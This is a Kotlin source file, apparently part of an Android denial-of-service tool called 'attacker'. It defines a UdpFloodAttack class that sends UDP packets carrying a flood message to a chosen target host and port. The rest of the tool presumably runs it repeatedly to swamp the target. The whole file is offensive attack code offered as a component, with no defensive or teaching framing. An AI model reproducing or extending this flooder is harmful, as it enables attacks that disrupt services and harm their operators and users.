package com.shifthackz.android.attacker.attack.udp_flood

import com.shifthackz.android.attacker.attack.contract.Attack
import com.shifthackz.android.attacker.attack.contract.AttackParam
import com.shifthackz.android.attacker.attack.contract.AttackType
import com.shifthackz.android.attacker.logging.LogCollector
import org.koin.java.KoinJavaComponent
import java.io.IOException
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.net.SocketException

class UdpFloodAttack(params: Map<AttackParam, Any>) : Attack() {

    private val log: LogCollector by KoinJavaComponent.inject(LogCollector::class.java)

    override val type: AttackType = AttackType.UDP_FLOOD

    override val runner: () -> Unit = {
        try {
            val udpPort = "${params[AttackParam.PORT]}".toInt()
            val udpSocket = DatagramSocket()
            val serverAddress = InetAddress.getByName("${params[AttackParam.TARGET]}")
            val sendBytes = "${params[AttackParam.FLOOD_MSG]}".toByteArray(Charsets.UTF_8)
            val packet = DatagramPacket(sendBytes, sendBytes.size, serverAddress, udpPort)
            udpSocket.send(packet)
            log.collectPacketMessage()
            udpSocket.disconnect()
        } catch (e: SocketException) {
            log.collectError(e)
            e.printStackTrace()
        } catch (e: IOException) {
            log.collectError(e)
            e.printStackTrace()
        }
    }
}